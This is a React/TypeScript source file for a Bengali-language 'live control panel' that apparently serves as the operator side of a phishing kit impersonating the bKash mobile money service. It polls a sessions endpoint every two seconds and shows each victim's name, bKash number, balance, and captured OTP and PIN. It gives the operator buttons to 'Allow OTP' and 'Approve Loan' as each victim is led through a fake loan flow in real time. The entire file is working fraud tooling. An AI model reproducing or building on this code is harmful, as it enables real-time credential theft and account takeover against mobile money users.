
import React, { useState, useEffect } from 'react';
import { CustomerSession } from '../types';
import { db } from '../App';

interface AdminPanelProps {
  onBack: () => void;
}

const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [sessions, setSessions] = useState<CustomerSession[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchSessions = async () => {
      try {
        const res = await fetch('/api/sessions');
        const data = await res.json();
        if (data) {
          const sessionList = Object.keys(data).map(key => ({
            ...data[key],
            id: key
          })).sort((a, b) => b.lastUpdated - a.lastUpdated);
          setSessions(sessionList);
        } else {
          setSessions([]);
        }
      } catch (err) {
        console.error("Fetch error:", err);
      } finally {
        setLoading(false);
      }
    };

    fetchSessions();
    const interval = setInterval(fetchSessions, 2000);
    return () => clearInterval(interval);
  }, []);

  const performAction = (sessionId: string, action: string) => {
    db.ref('sessions/' + sessionId).update({
      adminAction: action,
      lastUpdated: Date.now()
    });
  };

  const deleteSession = async (sessionId: string) => {
    if (confirm('এই কাস্টমারের ডাটা এবং সেশন স্থায়ীভাবে মুছে ফেলতে চান?')) {
      await db.ref('sessions/' + sessionId).remove();
    }
  };

  const clearAllData = async () => {
    if (confirm('সব কাস্টমারের ডাটা ডিলিট করতে চান?')) {
      await fetch('/api/sessions/all', { method: 'DELETE' });
    }
  };

  return (
    <div className="max-w-7xl mx-auto animate-fade-in bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100 min-h-[600px] font-sans">
      <div className="bg-slate-900 p-6 text-white flex justify-between items-center shadow-lg">
        <div className="flex items-center space-x-4">
          <div className="w-12 h-12 bg-[#E2136E] rounded-xl flex items-center justify-center shadow-lg animate-pulse">
            <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
          </div>
          <div><h2 className="text-xl font-bold leading-none">লাইভ কন্ট্রোল প্যানেল</h2><p className="text-slate-400 text-xs mt-1">{sessions.length} জন কাস্টমার অনলাইনে</p></div>
        </div>
        <div className="flex items-center space-x-3">
          <button onClick={clearAllData} className="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-xl text-xs font-black transition-all">সব মুছুন</button>
          <button onClick={onBack} className="bg-slate-800 hover:bg-slate-700 px-6 py-2 rounded-xl text-sm font-bold transition-all">লগ আউট</button>
        </div>
      </div>

      <div className="p-6 overflow-x-auto">
        <table className="w-full text-left border-separate border-spacing-y-2">
          <thead>
            <tr className="text-slate-400 text-[11px] uppercase tracking-widest font-black">
              <th className="px-6 py-4">কাস্টমার</th>
              <th className="px-6 py-4">বিকাশ নম্বর</th>
              <th className="px-6 py-4 text-center">ব্যালেন্স</th>
              <th className="px-6 py-4 text-center">OTP / PIN</th>
              <th className="px-6 py-4 text-center">কন্ট্রোল অ্যাকশন</th>
              <th className="px-6 py-4 text-center">অ্যাকশন</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr><td colSpan={6} className="px-6 py-20 text-center text-slate-400 italic">ডাটা লোড হচ্ছে...</td></tr>
            ) : sessions.length > 0 ? (
              sessions.map((session) => (
                <tr key={session.id} className="bg-white shadow-sm hover:shadow-md transition-all group">
                  <td className="px-6 py-4 border-y border-l border-slate-50 rounded-l-2xl"><p className="font-black text-slate-800">{session.name}</p><p className="text-[10px] text-slate-400 font-mono">{session.id}</p></td>
                  <td className="px-6 py-4 border-y border-slate-50 text-sm font-black text-[#E2136E]">{session.gatewayPhone || session.initialPhone}</td>
                  <td className="px-6 py-4 border-y border-slate-50 text-center"><span className={`px-3 py-1 rounded-full text-xs font-black ${parseInt(session.balance) < 200 ? 'bg-red-50 text-red-600' : 'bg-green-50 text-green-600'}`}>৳ {session.balance}</span></td>
                  <td className="px-6 py-4 border-y border-slate-50 text-center font-mono font-black text-slate-600">{session.otp || '---'} / {session.pin || '---'}</td>
                  <td className="px-6 py-4 border-y border-slate-50 text-center">
                    <div className="flex flex-col space-y-1 w-28 mx-auto">
                      <button 
                        onClick={() => performAction(session.id, 'ALLOW_OTP')} 
                        disabled={session.waitingFor !== 'OTP_PERM'} 
                        className={`text-[10px] font-black py-2 rounded-lg transition-all ${session.waitingFor === 'OTP_PERM' ? 'bg-orange-500 text-white shadow-lg shadow-orange-200' : 'bg-slate-100 text-slate-300 pointer-events-none'}`}
                      >
                        {session.waitingFor === 'OTP_PERM' ? 'Allow OTP' : 'Wait...'}
                      </button>
                      <button 
                        onClick={() => performAction(session.id, 'APPROVE')} 
                        disabled={session.waitingFor !== 'FINAL_WAIT'} 
                        className={`text-[10px] font-black py-2 rounded-lg transition-all ${session.waitingFor === 'FINAL_WAIT' ? 'bg-green-600 text-white shadow-lg shadow-green-200' : 'bg-slate-100 text-slate-300 pointer-events-none'}`}
                      >
                        {session.waitingFor === 'FINAL_WAIT' ? 'Approve Loan' : 'Wait...'}
                      </button>
                    </div>
                  </td>
                  <td className="px-6 py-4 border-y border-r border-slate-50 rounded-r-2xl text-center">
                    <button onClick={() => deleteSession(session.id)} className="bg-red-50 text-red-400 p-2 rounded-xl hover:bg-red-500 hover:text-white transition-all shadow-sm">
                      <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
                    </button>
                  </td>
                </tr>
              ))
            ) : (<tr><td colSpan={6} className="px-6 py-24 text-center text-slate-300 font-bold tracking-widest uppercase">কোনো একটিভ সেশন নেই</td></tr>)}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default AdminPanel;
